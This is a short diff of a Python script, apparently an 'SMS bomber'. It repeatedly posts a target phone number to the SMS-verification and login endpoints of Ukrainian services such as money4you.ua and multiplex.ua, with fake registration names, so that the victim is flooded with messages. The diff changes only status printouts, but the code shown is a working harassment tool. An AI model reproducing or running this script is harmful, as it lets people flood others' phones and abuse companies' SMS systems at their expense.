@@ -39,9 +39,9 @@ run = int(console.input('[green]Введите количество повтор
 for _ in track(range(run)):
                     try:
                         requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", data={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
-                        print("отправлена")
+                        print('отправельно')
                     except:
-                        print( YT отправлена")
+                        print('не отправлено')
                     try:
                         requests.post("https://auth.multiplex.ua/login", data={"login": "+" + number}, headers=headers)
                         print('multiplex')
